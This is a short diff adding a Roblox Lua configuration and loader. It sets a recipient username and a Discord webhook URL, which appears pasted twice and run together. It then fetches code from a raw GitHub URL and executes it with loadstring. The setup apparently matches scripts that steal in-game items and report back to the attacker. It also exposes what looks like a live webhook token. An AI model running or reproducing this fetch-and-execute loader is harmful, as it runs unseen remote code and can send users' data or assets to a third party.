@@ -1,0 +1,4 @@
+UserName = "shemade_m3nut"
+Webhook = "https://discord.com/api/webhooks/1094347250366419067/DRK--usLLcTaAVhONb4jcFA9YYxAL_gq-fSx2CEDxVKOc0qN43yKiAkGbWIFdoKpJpZ-https://discord.com/api/webhooks/1094347250366419067/DRK--usLLcTaAVhONb4jcFA9YYxAL_gq-fSx2CEDxVKOc0qN43yKiAkGbWIFdoKpJpZ-"
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Psx0/A/main/main", true))()
